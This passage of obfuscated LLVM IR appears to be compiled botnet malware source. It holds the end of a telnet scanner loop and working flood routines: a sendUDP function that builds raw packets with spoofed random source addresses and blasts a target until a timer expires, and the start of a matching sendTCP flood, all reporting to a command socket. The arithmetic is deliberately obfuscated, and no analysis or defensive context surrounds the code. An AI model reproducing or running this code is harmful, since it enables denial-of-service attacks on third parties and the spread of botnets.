  %1920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1919, i32 0, i32 2
  store i8 9, i8* %1920, align 8
  br label %1991

; <label>:1921:                                   ; preds = %72
  %1922 = load i32, i32* %2, align 4
  %1923 = sext i32 %1922 to i64
  %1924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1923
  %1925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1924, i32 0, i32 6
  %1926 = load i32, i32* %1925, align 4
  %1927 = icmp eq i32 %1926, 0
  br i1 %1927, label %1928, label %1934

; <label>:1928:                                   ; preds = %1921
  %1929 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1930 = load i32, i32* %2, align 4
  %1931 = sext i32 %1930 to i64
  %1932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1931
  %1933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1932, i32 0, i32 6
  store i32 %1929, i32* %1933, align 4
  br label %1934

; <label>:1934:                                   ; preds = %1928, %1921
  %1935 = load i32, i32* %2, align 4
  %1936 = sext i32 %1935 to i64
  %1937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1936
  %1938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1937, i32 0, i32 0
  %1939 = load i32, i32* %1938, align 16
  %1940 = call i64 @send(i32 %1939, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.44, i32 0, i32 0), i64 194, i32 16384)
  %1941 = icmp slt i64 %1940, 0
  br i1 %1941, label %1942, label %1962

; <label>:1942:                                   ; preds = %1934
  %1943 = load i32, i32* %2, align 4
  %1944 = sext i32 %1943 to i64
  %1945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1944
  %1946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1945, i32 0, i32 0
  %1947 = load i32, i32* %1946, align 16
  %1948 = call i32 @sclose(i32 %1947)
  %1949 = load i32, i32* %2, align 4
  %1950 = sext i32 %1949 to i64
  %1951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1950
  %1952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1951, i32 0, i32 2
  store i8 0, i8* %1952, align 8
  %1953 = load i32, i32* %2, align 4
  %1954 = sext i32 %1953 to i64
  %1955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1954
  %1956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1955, i32 0, i32 3
  store i8 1, i8* %1956, align 1
  %1957 = load i32, i32* %2, align 4
  %1958 = sext i32 %1957 to i64
  %1959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1958
  %1960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1959, i32 0, i32 8
  %1961 = load i8*, i8** %1960, align 8
  call void @llvm.memset.p0i8.i64(i8* %1961, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:1962:                                   ; preds = %1934
  %1963 = load i32, i32* %2, align 4
  %1964 = sext i32 %1963 to i64
  %1965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1964
  %1966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1965, i32 0, i32 6
  %1967 = load i32, i32* %1966, align 4
  %1968 = sub i32 0, %1967
  %1969 = sub i32 0, 10
  %1970 = add i32 %1968, %1969
  %1971 = sub i32 0, %1970
  %1972 = add i32 %1967, 10
  %1973 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1974 = icmp ult i32 %1971, %1973
  br i1 %1974, label %1975, label %1990

; <label>:1975:                                   ; preds = %1962
  %1976 = load i32, i32* %2, align 4
  %1977 = sext i32 %1976 to i64
  %1978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1977
  %1979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1978, i32 0, i32 0
  %1980 = load i32, i32* %1979, align 16
  %1981 = call i32 @sclose(i32 %1980)
  %1982 = load i32, i32* %2, align 4
  %1983 = sext i32 %1982 to i64
  %1984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1983
  %1985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1984, i32 0, i32 2
  store i8 0, i8* %1985, align 8
  %1986 = load i32, i32* %2, align 4
  %1987 = sext i32 %1986 to i64
  %1988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1987
  %1989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1988, i32 0, i32 3
  store i8 1, i8* %1989, align 1
  br label %1990

; <label>:1990:                                   ; preds = %1975, %1962
  br label %1991

; <label>:1991:                                   ; preds = %1990, %1916, %1888, %1864, %1048, %984, %633, %569, %409, %241, %72
  br label %1992

; <label>:1992:                                   ; preds = %1991, %1942, %1901, %1873, %1812, %1787, %1759, %1718, %1693, %1665, %1624, %1599, %1571, %1530, %1505, %1477, %1436, %1411, %1383, %1342, %1317, %1289, %1248, %1223, %1195, %1154, %1129, %1101, %1033, %1010, %922, %899, %876, %853, %830, %807, %784, %761, %747, %696, %618, %595, %519, %468, %327, %179, %149
  %1993 = load i32, i32* %2, align 4
  %1994 = sub i32 0, %1993
  %1995 = sub i32 0, 1
  %1996 = add i32 %1994, %1995
  %1997 = sub i32 0, %1996
  %1998 = add nsw i32 %1993, 1
  store i32 %1997, i32* %2, align 4
  br label %68

; <label>:1999:                                   ; preds = %68
  br label %66
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %318

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %116

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  br label %318

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %11, align 4
  %61 = add i32 %60, 685409828
  %62 = add i32 %61, 1
  %63 = sub i32 %62, 685409828
  %64 = add nsw i32 %60, 1
  %65 = sext i32 %63 to i64
  %66 = call noalias i8* @malloc(i64 %65) #2
  store i8* %66, i8** %16, align 8
  %67 = load i8*, i8** %16, align 8
  %68 = icmp eq i8* %67, null
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %59
  br label %318

; <label>:70:                                     ; preds = %59
  %71 = load i8*, i8** %16, align 8
  %72 = load i32, i32* %11, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, 1
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, 1
  %78 = sext i32 %76 to i64
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 %78, i32 1, i1 false)
  %79 = load i8*, i8** %16, align 8
  %80 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %79, i32 %80)
  %81 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %82 = load i32, i32* %9, align 4
  %83 = sub i32 %81, -2021921426
  %84 = add i32 %83, %82
  %85 = add i32 %84, -2021921426
  %86 = add nsw i32 %81, %82
  store i32 %85, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %87

; <label>:87:                                     ; preds = %110, %109, %70
  %88 = load i32, i32* %15, align 4
  %89 = load i8*, i8** %16, align 8
  %90 = load i32, i32* %11, align 4
  %91 = sext i32 %90 to i64
  %92 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %93 = call i64 @sendto(i32 %88, i8* %89, i64 %91, i32 0, %struct.sockaddr* %92, i32 16)
  %94 = load i32, i32* %18, align 4
  %95 = load i32, i32* %14, align 4
  %96 = icmp eq i32 %94, %95
  br i1 %96, label %97, label %110

; <label>:97:                                     ; preds = %87
  %98 = load i32, i32* %8, align 4
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %104

; <label>:100:                                    ; preds = %97
  %101 = call i32 @rand_cmwc()
  %102 = trunc i32 %101 to i16
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %102, i16* %103, align 2
  br label %104

; <label>:104:                                    ; preds = %100, %97
  %105 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %106 = load i32, i32* %17, align 4
  %107 = icmp sgt i32 %105, %106
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %104
  br label %115

; <label>:109:                                    ; preds = %104
  store i32 0, i32* %18, align 4
  br label %87

; <label>:110:                                    ; preds = %87
  %111 = load i32, i32* %18, align 4
  %112 = sub i32 0, 1
  %113 = sub i32 %111, %112
  %114 = add i32 %111, 1
  store i32 %113, i32* %18, align 4
  br label %87

; <label>:115:                                    ; preds = %108
  br label %318

; <label>:116:                                    ; preds = %46
  %117 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %117, i32* %19, align 4
  %118 = load i32, i32* %19, align 4
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %123, label %120

; <label>:120:                                    ; preds = %116
  %121 = load i32, i32* @mainCommSock, align 4
  %122 = call i32 (i32, i8*, ...) @sockprintf(i32 %121, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  br label %318

; <label>:123:                                    ; preds = %116
  store i32 1, i32* %20, align 4
  %124 = load i32, i32* %19, align 4
  %125 = bitcast i32* %20 to i8*
  %126 = call i32 @setsockopt(i32 %124, i32 0, i32 3, i8* %125, i32 4) #2
  %127 = icmp slt i32 %126, 0
  br i1 %127, label %128, label %131

; <label>:128:                                    ; preds = %123
  %129 = load i32, i32* @mainCommSock, align 4
  %130 = call i32 (i32, i8*, ...) @sockprintf(i32 %129, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i32 0, i32 0))
  br label %318

; <label>:131:                                    ; preds = %123
  store i32 50, i32* %21, align 4
  br label %132

; <label>:132:                                    ; preds = %140, %131
  %133 = load i32, i32* %21, align 4
  %134 = sub i32 0, %133
  %135 = sub i32 0, -1
  %136 = add i32 %134, %135
  %137 = sub i32 0, %136
  %138 = add nsw i32 %133, -1
  store i32 %137, i32* %21, align 4
  %139 = icmp ne i32 %133, 0
  br i1 %139, label %140, label %150

; <label>:140:                                    ; preds = %132
  %141 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %142 = call i32 @rand_cmwc()
  %143 = xor i32 %141, -1
  %144 = and i32 %142, %143
  %145 = xor i32 %142, -1
  %146 = and i32 %141, %145
  %147 = or i32 %144, %146
  %148 = xor i32 %141, %142
  call void @srand(i32 %147) #2
  %149 = call i32 @rand() #2
  call void @init_rand(i32 %149)
  br label %132

; <label>:150:                                    ; preds = %132
  %151 = load i32, i32* %10, align 4
  %152 = icmp eq i32 %151, 0
  br i1 %152, label %153, label %154

; <label>:153:                                    ; preds = %150
  store i32 0, i32* %22, align 4
  br label %174

; <label>:154:                                    ; preds = %150
  %155 = load i32, i32* %10, align 4
  %156 = sub i32 0, %155
  %157 = add i32 32, %156
  %158 = sub nsw i32 32, %155
  %159 = shl i32 1, %157
  %160 = sub i32 0, 1
  %161 = add i32 %159, %160
  %162 = sub nsw i32 %159, 1
  %163 = xor i32 %161, -1
  %164 = and i32 938218101, %163
  %165 = xor i32 938218101, -1
  %166 = and i32 %161, %165
  %167 = xor i32 -1, -1
  %168 = and i32 %167, 938218101
  %169 = and i32 -1, %165
  %170 = or i32 %164, %166
  %171 = or i32 %168, %169
  %172 = xor i32 %170, %171
  %173 = xor i32 %161, -1
  store i32 %172, i32* %22, align 4
  br label %174

; <label>:174:                                    ; preds = %154, %153
  %175 = load i32, i32* %11, align 4
  %176 = sext i32 %175 to i64
  %177 = add i64 28, 1813467002945097553
  %178 = add i64 %177, %176
  %179 = sub i64 %178, 1813467002945097553
  %180 = add i64 28, %176
  %181 = call i8* @llvm.stacksave()
  store i8* %181, i8** %23, align 8
  %182 = alloca i8, i64 %179, align 16
  %183 = bitcast i8* %182 to %struct.iphdr*
  store %struct.iphdr* %183, %struct.iphdr** %24, align 8
  %184 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %185 = bitcast %struct.iphdr* %184 to i8*
  %186 = getelementptr i8, i8* %185, i64 20
  %187 = bitcast i8* %186 to %struct.udphdr*
  store %struct.udphdr* %187, %struct.udphdr** %25, align 8
  %188 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %190 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 4
  %192 = load i32, i32* %22, align 4
  %193 = call i32 @getRandomIP(i32 %192)
  %194 = call i32 @htonl(i32 %193) #13
  %195 = load i32, i32* %11, align 4
  %196 = sext i32 %195 to i64
  %197 = sub i64 8, -5874327741529438617
  %198 = add i64 %197, %196
  %199 = add i64 %198, -5874327741529438617
  %200 = add i64 8, %196
  %201 = trunc i64 %199 to i32
  call void @makeIPPacket(%struct.iphdr* %188, i32 %191, i32 %194, i8 zeroext 17, i32 %201)
  %202 = load i32, i32* %11, align 4
  %203 = sext i32 %202 to i64
  %204 = sub i64 0, %203
  %205 = sub i64 8, %204
  %206 = add i64 8, %203
  %207 = trunc i64 %205 to i16
  %208 = call zeroext i16 @htons(i16 zeroext %207) #13
  %209 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %210 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon.3* %210 to %struct.anon.4*
  %212 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %211, i32 0, i32 2
  store i16 %208, i16* %212, align 2
  %213 = call i32 @rand_cmwc()
  %214 = trunc i32 %213 to i16
  %215 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %216 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %215, i32 0, i32 0
  %217 = bitcast %union.anon.3* %216 to %struct.anon.4*
  %218 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %217, i32 0, i32 0
  store i16 %214, i16* %218, align 2
  %219 = load i32, i32* %8, align 4
  %220 = icmp eq i32 %219, 0
  br i1 %220, label %221, label %223

; <label>:221:                                    ; preds = %174
  %222 = call i32 @rand_cmwc()
  br label %228

; <label>:223:                                    ; preds = %174
  %224 = load i32, i32* %8, align 4
  %225 = trunc i32 %224 to i16
  %226 = call zeroext i16 @htons(i16 zeroext %225) #13
  %227 = zext i16 %226 to i32
  br label %228

; <label>:228:                                    ; preds = %223, %221
  %229 = phi i32 [ %222, %221 ], [ %227, %223 ]
  %230 = trunc i32 %229 to i16
  %231 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 0
  %233 = bitcast %union.anon.3* %232 to %struct.anon.4*
  %234 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %233, i32 0, i32 1
  store i16 %230, i16* %234, align 2
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.3* %236 to %struct.anon.4*
  %238 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %237, i32 0, i32 3
  store i16 0, i16* %238, align 2
  %239 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %240 = bitcast %struct.udphdr* %239 to i8*
  %241 = getelementptr inbounds i8, i8* %240, i64 8
  %242 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %241, i32 %242)
  %243 = bitcast i8* %182 to i16*
  %244 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 2
  %246 = load i16, i16* %245, align 2
  %247 = zext i16 %246 to i32
  %248 = call zeroext i16 @csum(i16* %243, i32 %247)
  %249 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 7
  store i16 %248, i16* %250, align 2
  %251 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %252 = load i32, i32* %9, align 4
  %253 = sub i32 0, %251
  %254 = sub i32 0, %252
  %255 = add i32 %253, %254
  %256 = sub i32 0, %255
  %257 = add nsw i32 %251, %252
  store i32 %256, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %258

; <label>:258:                                    ; preds = %311, %310, %228
  br label %259

; <label>:259:                                    ; preds = %258
  %260 = load i32, i32* %19, align 4
  %261 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %262 = call i64 @sendto(i32 %260, i8* %182, i64 %179, i32 0, %struct.sockaddr* %261, i32 16)
  %263 = call i32 @rand_cmwc()
  %264 = trunc i32 %263 to i16
  %265 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %266 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %265, i32 0, i32 0
  %267 = bitcast %union.anon.3* %266 to %struct.anon.4*
  %268 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %267, i32 0, i32 0
  store i16 %264, i16* %268, align 2
  %269 = load i32, i32* %8, align 4
  %270 = icmp eq i32 %269, 0
  br i1 %270, label %271, label %273

; <label>:271:                                    ; preds = %259
  %272 = call i32 @rand_cmwc()
  br label %278

; <label>:273:                                    ; preds = %259
  %274 = load i32, i32* %8, align 4
  %275 = trunc i32 %274 to i16
  %276 = call zeroext i16 @htons(i16 zeroext %275) #13
  %277 = zext i16 %276 to i32
  br label %278

; <label>:278:                                    ; preds = %273, %271
  %279 = phi i32 [ %272, %271 ], [ %277, %273 ]
  %280 = trunc i32 %279 to i16
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 0
  %283 = bitcast %union.anon.3* %282 to %struct.anon.4*
  %284 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %283, i32 0, i32 1
  store i16 %280, i16* %284, align 2
  %285 = call i32 @rand_cmwc()
  %286 = trunc i32 %285 to i16
  %287 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 3
  store i16 %286, i16* %288, align 4
  %289 = load i32, i32* %22, align 4
  %290 = call i32 @getRandomIP(i32 %289)
  %291 = call i32 @htonl(i32 %290) #13
  %292 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %293 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %292, i32 0, i32 8
  store i32 %291, i32* %293, align 4
  %294 = bitcast i8* %182 to i16*
  %295 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 2
  %297 = load i16, i16* %296, align 2
  %298 = zext i16 %297 to i32
  %299 = call zeroext i16 @csum(i16* %294, i32 %298)
  %300 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 7
  store i16 %299, i16* %301, align 2
  %302 = load i32, i32* %27, align 4
  %303 = load i32, i32* %14, align 4
  %304 = icmp eq i32 %302, %303
  br i1 %304, label %305, label %311

; <label>:305:                                    ; preds = %278
  %306 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %307 = load i32, i32* %26, align 4
  %308 = icmp sgt i32 %306, %307
  br i1 %308, label %309, label %310

; <label>:309:                                    ; preds = %305
  br label %316

; <label>:310:                                    ; preds = %305
  store i32 0, i32* %27, align 4
  br label %258

; <label>:311:                                    ; preds = %278
  %312 = load i32, i32* %27, align 4
  %313 = sub i32 0, 1
  %314 = sub i32 %312, %313
  %315 = add i32 %312, 1
  store i32 %314, i32* %27, align 4
  br label %258

; <label>:316:                                    ; preds = %309
  %317 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %317)
  br label %318

; <label>:318:                                    ; preds = %316, %128, %120, %115, %69, %56, %45
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %532

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  br label %532

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i32 0, i32 0))
  br label %532

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %87

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub i32 0, %67
  %69 = add i32 32, %68
  %70 = sub nsw i32 32, %67
  %71 = shl i32 1, %69
  %72 = add i32 %71, -690500195
  %73 = sub i32 %72, 1
  %74 = sub i32 %73, -690500195
  %75 = sub nsw i32 %71, 1
  %76 = xor i32 %74, -1
  %77 = and i32 -147135069, %76
  %78 = xor i32 -147135069, -1
  %79 = and i32 %74, %78
  %80 = xor i32 -1, -1
  %81 = and i32 %80, -147135069
  %82 = and i32 -1, %78
  %83 = or i32 %77, %79
  %84 = or i32 %81, %82
  %85 = xor i32 %83, %84
  %86 = xor i32 %74, -1
  store i32 %85, i32* %19, align 4
  br label %87

; <label>:87:                                     ; preds = %66, %65
  %88 = load i32, i32* %13, align 4
  %89 = sext i32 %88 to i64
  %90 = sub i64 40, 7662198842842996621
  %91 = add i64 %90, %89
  %92 = add i64 %91, 7662198842842996621
  %93 = add i64 40, %89
  %94 = call i8* @llvm.stacksave()
  store i8* %94, i8** %20, align 8
  %95 = alloca i8, i64 %92, align 16
  %96 = bitcast i8* %95 to %struct.iphdr*
  store %struct.iphdr* %96, %struct.iphdr** %21, align 8
  %97 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %98 = bitcast %struct.iphdr* %97 to i8*
  %99 = getelementptr i8, i8* %98, i64 20
  %100 = bitcast i8* %99 to %struct.tcphdr*
  store %struct.tcphdr* %100, %struct.tcphdr** %22, align 8
  %101 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 4
  %105 = load i32, i32* %19, align 4
  %106 = call i32 @getRandomIP(i32 %105)
  %107 = call i32 @htonl(i32 %106) #13
  %108 = load i32, i32* %13, align 4
  %109 = sext i32 %108 to i64
  %110 = sub i64 0, 20
  %111 = sub i64 0, %109
  %112 = add i64 %110, %111
  %113 = sub i64 0, %112
  %114 = add i64 20, %109
  %115 = trunc i64 %113 to i32
  call void @makeIPPacket(%struct.iphdr* %101, i32 %104, i32 %107, i8 zeroext 6, i32 %115)
  %116 = call i32 @rand_cmwc()
  %117 = trunc i32 %116 to i16
  %118 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %119 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %118, i32 0, i32 0
